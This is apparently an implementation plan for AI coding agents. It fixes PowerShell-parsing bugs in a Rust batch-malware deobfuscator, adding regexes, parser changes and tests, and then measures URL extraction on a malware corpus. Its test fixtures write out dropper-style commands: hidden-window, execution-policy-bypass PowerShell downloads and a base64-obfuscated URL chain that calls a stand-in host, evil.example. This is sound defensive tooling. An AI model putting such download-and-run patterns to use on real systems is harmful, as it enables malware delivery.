# batdeob Plan I — Fix the 5 PowerShell-handling bugs found in Plan H investigation

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Recover URL extraction on the ~54 corpus samples blocked by five concrete bugs identified during a 100-payload investigation. Plan H added correct deobfuscation depth; Plan I clears the path so those features (and the existing Plan F/G features) actually reach the corpus's PowerShell payloads.

**Prereq:** Plans A–H landed. 223 tests, 100% corpus success. v7 has 631 Download traits.

**Findings from `/tmp/ps_inspect/` investigation:**

| Bug | Samples affected | Root cause |
|---|---:|---|
| A | 39 | `h_powershell` falls to `tokens.last()` when no `-Command`/`-Enc` flag → captures `-OutFile` path, drops the URL command |
| B | 8 | `IWR_RE` doesn't recognize `iwr` or `wget` aliases |
| C | 16 | `IWR_RE` requires quoted URL; corpus has unquoted: `Invoke-WebRequest -Uri https://x` |
| D | 5 | `[Encoding]::GetString('decoded-url')` wrapper prevents `$var = ...` binding |
| E | 5 | `START_RE` doesn't strip quoted title: `start "" /min powershell …` |

Combined: 54 unique samples → would add ~54+ Download traits.

---

## Task 1: Fix `h_powershell` positional-argument fallback (Bug A — highest impact)

**Files:**
- Modify: `rust/crates/batdeob-core/src/handlers/powershell.rs`
- Modify: `rust/crates/batdeob-core/src/lib.rs` (tests)

**Current bug**: when no `-Command`/`-EncodedCommand`/`-File` flag is found, the fallback grabs only `tokens.last()`. For `powershell -windowstyle hidden Invoke-WebRequest http://x/y.exe -OutFile c.exe`, that "last" is `c.exe`. The IWR command and URL never reach `ps1_scan`.

**Fix**: when no flag matches, collect all tokens after skipping known PS-meta flags. Push the joined remainder as the ps1 payload.

- [ ] **Step 1: Add tests** to `lib.rs`:

```rust
#[cfg(test)]
mod ps_positional_fallback_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;
    use crate::{analyze};

    #[test]
    fn powershell_positional_iwr_captured() {
        let mut env = Environment::new(&Config::default());
        interpret_line("powershell invoke-webrequest -uri http://x.example/y.exe -outfile c.exe", &mut env);
        assert_eq!(env.exec_ps1.len(), 1, "no ps1 payload captured");
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]);
        assert!(stored.contains("invoke-webrequest"), "got: {}", stored);
        assert!(stored.contains("x.example/y.exe"), "URL missing: {}", stored);
    }

    #[test]
    fn powershell_with_meta_flags_then_positional() {
        let script = b"powershell -windowstyle hidden -ExecutionPolicy Bypass invoke-webrequest -uri http://x.example/y.exe -outfile c.exe\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.example/y.exe")
        ));
        assert!(has, "no Download trait from positional IWR: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Verify they fail**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --package batdeob-core ps_positional 2>&1 | tail -10
```

- [ ] **Step 3: Rewrite the fallback path in `h_powershell`**

Find the bottom of `h_powershell` in `handlers/powershell.rs`. The current code is roughly:

```rust
    if let Some(last) = tokens.last() {
        let s = last.trim_matches('"').trim_matches('\'');
        if !s.is_empty() {
            env.exec_ps1.push(s.as_bytes().to_vec());
        }
    }
```

Replace with:

```rust
    // No -Command/-EncodedCommand/-File flag was found. The PowerShell command
    // is in the positional arguments. Skip known PS-meta flags (and their values
    // when they take one) and push the remainder as the script body.
    let body = skip_ps_meta_flags(&tokens[1..]);
    if !body.is_empty() {
        env.exec_ps1.push(body.as_bytes().to_vec());
    }
}

/// Known PowerShell.exe options. The `*_VALUED` set takes a value argument; the
/// bare set is a switch.
fn skip_ps_meta_flags(tokens: &[String]) -> String {
    const FLAGS_NO_VALUE: &[&str] = &[
        "-noprofile", "-noninteractive", "-noexit", "-nologo",
        "-sta", "-mta",
    ];
    const FLAGS_WITH_VALUE: &[&str] = &[
        "-windowstyle", "-executionpolicy", "-version", "-inputformat",
        "-outputformat", "-encodedcommand",   // shouldn't occur here, but guard
        "-encoded", "-psconsolefile", "-configurationname",
    ];
    let mut out: Vec<String> = Vec::new();
    let mut i = 0;
    while i < tokens.len() {
        let t = &tokens[i];
        let lt = t.to_ascii_lowercase();
        // Accept both -flag and /flag
        let normalized = lt.strip_prefix('/').map(|s| format!("-{}", s)).unwrap_or(lt.clone());
        if FLAGS_NO_VALUE.contains(&normalized.as_str()) {
            i += 1;
            continue;
        }
        if FLAGS_WITH_VALUE.contains(&normalized.as_str()) {
            i += 2;
            continue;
        }
        out.push(t.clone());
        i += 1;
    }
    out.join(" ")
}
```

(Make sure the existing function body returns BEFORE this fallback in the flag-match cases. Verify by reading the file first.)

- [ ] **Step 4: Verify tests pass**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
```

- [ ] **Step 5: Commit**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "powershell: capture positional-args body instead of just tokens.last() (Bug A)"
```

---

## Task 2: IWR/IRM regex — add `iwr`/`wget` aliases + unquoted URL support (Bugs B + C)

**Files:**
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs`

**Current regexes**:
```rust
IWR_RE: r#"(?i)Invoke-WebRequest\s+(?:[^|]*?-Uri\s+)?["']([^"']+)["']"#
IRM_RE: r#"(?i)Invoke-RestMethod\s+(?:[^|]*?-Uri\s+)?["']([^"']+)["']"#
```

**Bugs**:
- B: `iwr` and `wget` aliases not handled
- C: unquoted URL not matched

**Fix**: broaden the cmdlet name alternation, make quotes optional, capture URLs via `https?://[^\s"']+` directly.

- [ ] **Step 1: Add tests** to `lib.rs`:

```rust
#[cfg(test)]
mod ps_iwr_variants_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    fn encode(payload: &str) -> String {
        let utf16: Vec<u8> = payload.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn iwr_alias_quoted_url() {
        let ps = r#"IWR -Uri "http://x.example/a.exe" -OutFile a.exe"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.example/a.exe")
        ));
        assert!(has, "iwr alias missed: {:?}", report.traits);
    }

    #[test]
    fn wget_alias_url() {
        let ps = r#"wget http://x.example/b.exe -OutFile b.exe"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.example/b.exe")
        ));
        assert!(has, "wget alias missed: {:?}", report.traits);
    }

    #[test]
    fn iwr_unquoted_url() {
        let ps = r#"Invoke-WebRequest -Uri http://x.example/c.exe -OutFile c.exe"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.example/c.exe")
        ));
        assert!(has, "unquoted URL missed: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Update the regexes** in `ps1_scan.rs`:

```rust
#[allow(clippy::expect_used)]
static IWR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|iwr|wget|curl)\b\s*(?:[^\n|]*?-Uri\s+)?\(?\s*["']?(https?://[^\s"'\)]+)["']?"#
    ).expect("iwr")
});

#[allow(clippy::expect_used)]
static IRM_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-RestMethod|irm)\b\s*(?:[^\n|]*?-Uri\s+)?\(?\s*["']?(https?://[^\s"'\)]+)["']?"#
    ).expect("irm")
});
```

Note: `curl` is a PowerShell alias for `Invoke-WebRequest`. Including it ALSO covers the cmd.exe `curl` references that leak into extracted ps1 (rare). The pattern doesn't capture the trailing quote/paren so URL extraction is clean.

- [ ] **Step 3: Verify**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
```

- [ ] **Step 4: Commit**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "ps1_scan: IWR/IRM regex tolerates iwr/wget/curl aliases + unquoted URLs (Bugs B+C)"
```

---

## Task 3: `[Encoding]::GetString` unwrap (Bug D)

**Files:**
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs`

**Pattern**: `$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLy4uLg=='))`

After Plan G's `expand_base64_literals`, the inner becomes `'http://...'`, but the surrounding `[Encoding]::*.GetString('http://...')` wrapper remains, blocking `PS_VAR_ASSIGN_RE`.

**Fix**: add `expand_getstring_wrapper` that strips the wrapper when its argument is already a quoted literal:

`[System.Text.Encoding]::UTF8.GetString('http://x')` → `'http://x'`

Same for `[Text.Encoding]::ASCII.GetString(...)`, `[Encoding]::Unicode.GetString(...)`, etc.

- [ ] **Step 1: Add test** to `lib.rs`:

```rust
#[cfg(test)]
mod ps_getstring_unwrap_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    fn encode_utf16(payload: &str) -> String {
        let utf16: Vec<u8> = payload.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn getstring_b64_chain_resolves_url() {
        use base64::Engine as _;
        let url_b64 = base64::engine::general_purpose::STANDARD.encode(b"http://evil.example/mego.bat");
        let ps = format!(
            r#"$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}')); Invoke-WebRequest -Uri $u -OutFile c.bat"#,
            url_b64
        );
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(&ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.example/mego.bat")
        ));
        assert!(has, "GetString b64 chain missed: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add the expander** to `ps1_scan.rs`:

```rust
#[allow(clippy::expect_used)]
static GETSTRING_UNWRAP_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*'([^']*)'\s*\)"
    ).expect("getstring unwrap")
});

fn expand_getstring_wrapper(text: &str) -> String {
    let mut out = text.to_string();
    let matches: Vec<(usize, usize, String)> = GETSTRING_UNWRAP_RE.captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{}'", inner)))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}
```

Wire into `expand_obfuscation` AFTER `expand_base64_literals` and BEFORE `expand_ps_variables`:

```rust
fn expand_obfuscation(text: &str) -> String {
    let mut out = text.to_string();
    out = expand_char_concat(&out);
    out = expand_string_concat(&out);
    out = expand_base64_literals(&out);
    out = expand_getstring_wrapper(&out);  // NEW
    out = expand_ps_join(&out);
    out = expand_ps_replace(&out);
    out = expand_ps_variables(&out);
    out
}
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/ps1_scan.rs rust/crates/batdeob-core/src/lib.rs
git commit -m "ps1_scan: unwrap [Encoding]::*.GetString('literal') to enable var binding (Bug D)"
```

---

## Task 4: Fix `h_start` for quoted-title argument (Bug E)

**Files:**
- Modify: `rust/crates/batdeob-core/src/handlers/cmd.rs`

**Current bug**: `START_RE` matches `start[.exe] /flags... <cmd>`. For `start "" /min powershell ...`, the `""` is the optional window title (a real cmd.exe feature). The regex captures it as part of `cmd`, then `interpret_line` looks up `""` as a command — nothing happens.

**Fix**: in `h_start`, after capturing `inner`, strip a leading quoted string if present (the title).

- [ ] **Step 1: Add test** to `lib.rs`:

```rust
#[cfg(test)]
mod start_title_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn start_quoted_title_then_powershell() {
        let script = b"start \"\" /min powershell -Command \"Invoke-WebRequest http://x.example/d.exe -OutFile d.exe\"\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.example/d.exe")
        ));
        assert!(has, "start title broke chain: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Update `h_start`** in `handlers/cmd.rs`:

Find the existing function. After extracting `inner`, add a leading-title strip:

```rust
pub fn h_start(raw: &str, env: &mut Environment) {
    let Some(caps) = START_RE.captures(raw) else { return };
    let inner_raw = caps.name("cmd").map(|m| m.as_str()).unwrap_or("").trim();
    if inner_raw.is_empty() { return }
    // Strip optional quoted title: start "" /flags cmd  OR  start "title" cmd
    let inner = strip_leading_quoted_title(inner_raw);
    if inner.is_empty() { return }
    crate::interp::interpret_line(inner, env);
}

fn strip_leading_quoted_title(s: &str) -> &str {
    let s = s.trim_start();
    if !s.starts_with('"') { return s; }
    let after_open = &s[1..];
    if let Some(close_idx) = after_open.find('"') {
        let after_close = &after_open[close_idx + 1..];
        return after_close.trim_start();
    }
    s
}
```

Note: the existing `START_RE` already strips flags BETWEEN start and cmd. After stripping the title, additional flags may appear (e.g., `start "" /min cmd`). The regex's flag-skip happens BEFORE the inner captures, so `start "" /min powershell ...` matches as `start "" /min powershell ...` → inner = `"" /min powershell ...`. With the title strip → `/min powershell ...`. The leading `/min` will then confuse `interpret_line` (which doesn't know `/min`). So ALSO strip any remaining `/flag` tokens at the start of `inner`:

Actually simpler — update the regex to allow flags BOTH before AND after the title. Replace `START_RE`:

```rust
#[allow(clippy::expect_used)]
static START_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)^\s*start(?:\.exe)?(?:\s+(?:/(?:min|max|wait|low|normal|abovenormal|belownormal|high|realtime|b|i|w)|"[^"]*"))*\s+(?P<cmd>.+)$"#
    ).expect("start regex")
});
```

The added `"[^"]*"` alternation in the prefix-skip group consumes the quoted title. Now `start "" /min powershell ...` correctly captures `cmd = powershell ...` directly.

With this regex change, the `strip_leading_quoted_title` helper isn't strictly necessary, but keep it as defense-in-depth.

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "start: strip optional quoted window title before the inner cmd (Bug E)"
```

---

## Task 5: Corpus v8 + validation

After Tasks 1-4 land, validate the +54 samples target.

- [ ] **Step 1: Build + corpus run**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3

sed 's|corpus_results_v7|corpus_results_v8|g' /tmp/corpus_run_v7.sh > /tmp/corpus_run_v8.sh
chmod +x /tmp/corpus_run_v8.sh
mkdir -p /tmp/corpus_results_v8 && rm -rf /tmp/corpus_results_v8/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v8.sh > /tmp/corpus_run_v8.log 2>&1
ls /tmp/corpus_results_v8/*.json | wc -l
```

- [ ] **Step 2: v7 vs v8 comparison** (read per-sample JSONs directly to bypass the index.jsonl bash-bc `.NNN` quirk):

```bash
python3 <<'PY'
import json
from pathlib import Path
from collections import Counter

def stats(d):
    samples = {}
    for f in Path(d).glob("*.json"):
        try: samples[f.stem] = json.load(open(f))
        except: pass
    return samples

v7 = stats("/tmp/corpus_results_v7")
v8 = stats("/tmp/corpus_results_v8")
common = set(v7) & set(v8)
print(f"v7={len(v7)} v8={len(v8)} common={len(common)}")

def counts(samples, keys):
    cnt = Counter()
    for k in keys:
        for t in samples[k].get("traits", []):
            cnt[t.get("kind","")] += 1
    return cnt

c7 = counts(v7, common)
c8 = counts(v8, common)
print(f"\nOn the {len(common)} common samples:")
print(f"{'Trait':30} {'v7':>8} {'v8':>8}  Δ")
for k in sorted(set(c7)|set(c8), key=lambda x: -max(c7[x], c8[x]))[:15]:
    delta = c8[k] - c7[k]
    sign = "+" if delta > 0 else ""
    print(f"  {k:28} {c7[k]:>8} {c8[k]:>8}  {sign}{delta}")

# Per-sample Download delta
gained = lost = 0; gain_total = 0
for k in common:
    d7 = sum(1 for t in v7[k].get("traits",[]) if t.get("kind")=="Download")
    d8 = sum(1 for t in v8[k].get("traits",[]) if t.get("kind")=="Download")
    if d8 > d7: gained += 1; gain_total += (d8 - d7)
    elif d7 > d8: lost += 1
print(f"\nDownload delta (v7 → v8): samples_gained={gained}  samples_lost={lost}  total_new_downloads={gain_total}")
PY
```

- [ ] **Step 3: Commit**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "Plan I complete: v8 corpus [paste the table]"
```

## Report

- v7 → v8 Download delta (target: +54 samples)
- Any regression (`samples_lost > 0`)
- Final test count (target: 223 + ~7 new = ~230)
- Commit SHA

---

## Self-review

- **Spec coverage**: 5 bugs from the investigation each get a focused task. Task 1 is the largest impact; Tasks 2-4 each address ~5-16 additional samples. Task 5 measures.
- **Placeholders**: none.
- **Type consistency**: no new trait variants; everything reuses existing `Trait::Download`.
- **Risk**: Task 1's `skip_ps_meta_flags` may incorrectly consume an arg of a flag that doesn't actually take one in real PowerShell. The list is conservative (only the ~13 most common). Unknown flags pass through into the body — that's the safe direction (preserves more text for URL scanning).

**Plan I complete.** Execute via `superpowers:subagent-driven-development`.
